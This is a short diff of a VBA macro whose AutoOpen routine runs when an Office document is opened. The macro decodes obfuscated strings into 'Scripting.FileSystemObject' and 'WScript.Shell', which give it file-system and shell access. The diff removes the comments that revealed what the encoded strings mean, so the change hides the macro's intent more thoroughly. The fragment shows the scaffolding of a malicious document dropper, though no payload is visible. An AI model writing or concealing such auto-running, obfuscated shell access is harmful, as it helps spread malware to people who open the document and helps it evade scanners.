@@ -4,11 +4,9 @@ Sub AutoOpen()
     Dim targetPath As String
     Dim shell As Object
     
-    ' String obfuscation for "Scripting.FileSystemObject"
     Dim fsoStr As String
     fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu")
     
-    ' String obfuscation for "WScript.Shell"
     Dim shellStr As String
     shellStr = DecodeString("XTdsjqu/Tifmm")
     
